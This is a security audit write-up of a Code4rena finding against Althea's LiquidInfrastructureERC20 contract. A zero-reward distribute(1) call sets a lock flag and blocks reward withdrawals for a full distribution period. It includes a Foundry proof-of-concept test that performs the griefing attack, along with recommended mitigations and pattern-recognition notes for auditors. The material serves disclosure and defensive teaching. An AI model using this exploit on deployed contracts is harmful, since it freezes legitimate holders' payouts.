# Denial of Service via Empty Distribution Griefing

- **Severity**: Medium
- **Source**: [Code4rena](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119) / [One Bug Per Day](https://www.onebugperday.com/v1/917)
- **Affected Contract**: [LiquidInfrastructureERC20.sol](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L360)
- **Vulnerability Type**: Denial of Service (DoS) - Griefing Attack

## Original Bug Description

> ### Vulnerability Details
>
> ### Description
>
> **Forenote**: To quote the Sponsor's public message:
>
> `"The most likely configuration would be roughly weekly or monthly, based on average block times."` and
>
> `"Althea-L1 will have a mempool, ..."`
>
> This is important to mention because this issue would not be significant if the minimum time between reward distribution was, for example, 100 blocks, and, since there is a mempool, front-running is possible.
>
> The project holds liquid NFTs, which accumulate rewards. These rewards are used to reward the `erc20` token holders.
>
> These rewards are transferred to the `liquiderc20` contract by using the two following functions:
>
> ```solidity
>function withdrawFromAllManagedNFTs() public {
>    withdrawFromManagedNFTs(ManagedNFTs.length);
>}
>
>function withdrawFromManagedNFTs(uint256 numWithdrawals) public {
>    require(!LockedForDistribution, "cannot withdraw during distribution");
>    if (nextWithdrawal == 0) {
>        emit WithdrawalStarted();
>    }
>    uint256 limit = Math.min(
>        numWithdrawals + nextWithdrawal,
>        ManagedNFTs.length
>    );
>    uint256 i;
>    for (i = nextWithdrawal; i < limit; i++) {
>        LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(
>            ManagedNFTs[i]
>        );
>        (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();
>        withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));
>        emit Withdrawal(address(withdrawFrom));
>    }
>    nextWithdrawal = i;
>    if (nextWithdrawal == ManagedNFTs.length) {
>        nextWithdrawal = 0;
>        emit WithdrawalFinished();
>    }
>}
> ```
>
> However, the problem here is the following check inside `withdrawFromManagedNFTs`:
>
> ```solidity
> require(!LockedForDistribution, "cannot withdraw during distribution");
> ```
>
> Even when there are 0 rewards in the current contract, a malicious user can still call `distribute(1)` to start the distribution process and to set the `LockedForDistribution` boolean to `true`.
>
> This results in no one being able to call `withdrawFromManagedNFTs` to get the rewards inside the `erc20` contract to distribute, which results in the next reward cycle being after `block.number + MinDistributionPeriod`.
>
> ### Proof of Concept
>
> There are roughly [7000 blocks per day](https://ycharts.com/indicators/ethereum_blocks_per_day), so we will use `(7000 * 30) = 210000 blocks` to mock a distribution period of roughly 1 month.
>
> We have written a Proof of Concept using Foundry, please follow the instructions provided and read the comments in the PoC for documentation.
>
> ```solidity
>// SPDX-License-Identifier: UNLICENSED
>pragma solidity 0.8.12;
>// git clone https://github.com/althea-net/liquid-infrastructure-contracts.git
>// cd liquid-infrastructure-contracts/
>// npm install
>// forge init --force
>// vim test/Test.t.sol 
>// save this test file
>// run using:
>// forge test --match-test "testGrieveCycles" -vvvv
>
>import {Test, console2} from "forge-std/Test.sol";
>import { LiquidInfrastructureERC20 } from "../contracts/LiquidInfrastructureERC20.sol";
>import { LiquidInfrastructureNFT } from "../contracts/LiquidInfrastructureNFT.sol";
>import { TestERC20A } from "../contracts/TestERC20A.sol";
>import { TestERC20B } from "../contracts/TestERC20B.sol";
>import { TestERC20C } from "../contracts/TestERC20C.sol";
>import { TestERC721A } from "../contracts/TestERC721A.sol";
>
>contract ERC20Test is Test {
>    LiquidInfrastructureERC20 liquidERC20;
>    TestERC20A erc20A;
>    TestERC20B erc20B;
>    TestERC20C erc20C;
>    LiquidInfrastructureNFT liquidNFT;
>    address owner = makeAddr("Owner");
>    address alice = makeAddr("Alice");
>    address bob = makeAddr("Bob");
>    address charlie = makeAddr("Charlie");
>    address delta = makeAddr("Delta");
>    address eve = makeAddr("Eve");
>    address malicious_user = makeAddr("malicious_user");
>    
>    function setUp() public {
>      vm.startPrank(owner);
>      // Create a rewardToken
>      address[] memory ERC20List = new address[](1);
>      erc20A = new TestERC20A();
>      ERC20List[0] = address(erc20A);
>
>      // Create managed NFT
>      address[] memory ERC721List = new address[](1);
>      liquidNFT = new LiquidInfrastructureNFT("LIQUID");
>      ERC721List[0] = address(liquidNFT);
>
>      // Create approved holders
>      address[] memory holderList = new address[](5);
>      holderList[0] = alice;
>      holderList[1] = bob;
>      holderList[2] = charlie;
>      holderList[3] = delta;
>      holderList[4] = eve;
>
>      // Create liquidERC20 and mint liquidERC20 to the approved holders
>      liquidERC20 = new LiquidInfrastructureERC20("LiquidERC20", "LIQ", ERC721List, holderList, 210000, ERC20List);
>      liquidERC20.mint(alice, 1e18);
>      liquidERC20.mint(bob, 1e18);
>      liquidERC20.mint(charlie, 1e18);
>      liquidERC20.mint(delta, 1e18);
>      liquidERC20.mint(eve, 1e18);
>
>      // Add threshold and rewardToken to liquidNFT
>      uint256[] memory amountList = new uint256[](1);
>      amountList[0] = 100;
>      liquidNFT.setThresholds(ERC20List, amountList);
>      liquidNFT.transferFrom(owner, address(liquidERC20), 1);
>
>      // Mint 5e18 rewardTokens to liquidNFT
>      erc20A.mint(address(liquidNFT), 5e18);
>      vm.stopPrank();
>    }
>
>    function testGrieveCycles() public {
>      // Go to block 210001, call withdrawFromAllManagedNFTs to get the rewards, and distribute everything to bring the token balance of the reward token to 0. This is just a sanity check.
>      vm.roll(210001);
>      liquidERC20.withdrawFromAllManagedNFTs();
>      liquidERC20.distributeToAllHolders();
>
>      // Go to block ((210000 * 2) + 1).
>      vm.roll(420001);
>
>      // Malicious user calls distribute
>      // This makes it temporarily unavailable to withdraw the rewards.
>      vm.prank(malicious_user);
>      liquidERC20.distribute(1);
> 
>      // Rewards can't be pulled or withdrawn from the ERC20 contract.
>      vm.expectRevert();
>      vm.prank(owner);
>      liquidERC20.withdrawFromAllManagedNFTs();
>
>      // This sets the next reward period to start at ((210000 * 3) + 1).
>      vm.startPrank(owner);
>      liquidERC20.distributeToAllHolders();
>      liquidERC20.withdrawFromAllManagedNFTs();
>      vm.stopPrank();
>
>      // Alice tried to get the rewards she had earned but could not get them, even with the rewards being in this contract, because the next reward cycle
>      // starts at block ((210000 * 2) + 1).
>      vm.expectRevert();
>      vm.prank(alice);
>      liquidERC20.distributeToAllHolders();
>    }
>}
> ```
>
> As you can see by running our PoC, a whole month of rewards is unable to be claimed by approved holders due to any person calling the distribute function, even if there are 0 rewards currently able to be distributed to the approved holders. For a project that is built upon rewarding its holders at a fixed period of time, this breaks the core functionality of the project.
>
> ### Tools Used
>
> Foundry
>
> ### Recommended Mitigation Steps
>
> Do not start a distribution cycle if there are no rewards that can be paid out to the approved holders + keep track of the rewards currently held in the `liquidNFT` and only start reward cycles when this amount that is held in the `liquidNFT` is sent to the `liquidERC20`. This prevents malicious users from sending 1 wei of rewardTokens to the `liquidERC20` to maliciously start a distribution cycle.

## Summary

A malicious user can grief the protocol by invoking a zero‐reward distribution, locking the contract's reward withdrawal mechanism for the full `MinDistributionPeriod`. This DoS-style griefing attack costs only gas but denies legitimate holders their expected payouts for the entire cycle.

## Real-World Context

- **Block Cadence Dependence**: Monthly or weekly distributions map to block counts (e.g., 210,000 blocks ≈ 30 days).
- **Mempool Front-Running**: Public visibility of pending transactions allows attackers to preempt honest withdrawal calls.
- **Infrastructure Revenue**: Fiber routers, network devices, or energy installations generate micropayments that rely on timely distributions.

## Key Details

- **Pattern**: Business logic lock exploited via zero-amount state change.
- **Root Cause**: LockedForDistribution flag can be set without actual funds present.
- **Risk**: Entire reward cycle denial, undermining trust and value of the revenue-sharing token.

## Vulnerable Code Reference

```solidity
function distribute(uint256 numDistributions) public nonReentrant {
    if (!LockedForDistribution) {
        require(_isPastMinDistributionPeriod(), "MinDistributionPeriod not met");
        _beginDistribution();  // sets LockedForDistribution = true
    }
    // processes recipients even when no balances exist
    ...
}

function withdrawFromManagedNFTs(uint256 numWithdrawals) public {
    require(!LockedForDistribution, "cannot withdraw during distribution");
    // blocked if LockedForDistribution==true, even with zero rewards
    ...
}
```

## Impact

Legitimate holders cannot withdraw NFT earnings or receive their revenue share for the next period, freezing payouts until after another full MinDistributionPeriod has passed.

## Mitigation

- **Guard Clause**: In `_beginDistribution()`, require that at least one distributable ERC-20 balance > 0.
- **State Tracking**: Maintain a counter of pending rewards withdrawn; only allow `distribute()` if counter > 0.
- **Dust Prevention**: Reject or ignore micro-transfers (< 1 wei) that could artificially trigger distribution.

## Pattern Recognition Notes

- Identify boolean locks or flags (e.g., `LockedForDistribution`, `paused`, `inProgress`) that can be set by any user before validating meaningful conditions
- Ensure critical public functions enforce preconditions (e.g., nonzero balances or pending work) before altering state
- **Red flags**: locks toggled unconditionally, empty-batch loops (`processBatch(n)`) accepting work when none exists
- **Common locations**: distribution/withdrawal functions, time- or block-gated logic, combined pull/push phases guarded by one flag
- **Testing approach**: attempt zero-reward or empty-batch calls and front-run withdrawal/distribution sequences in a public mempool environment
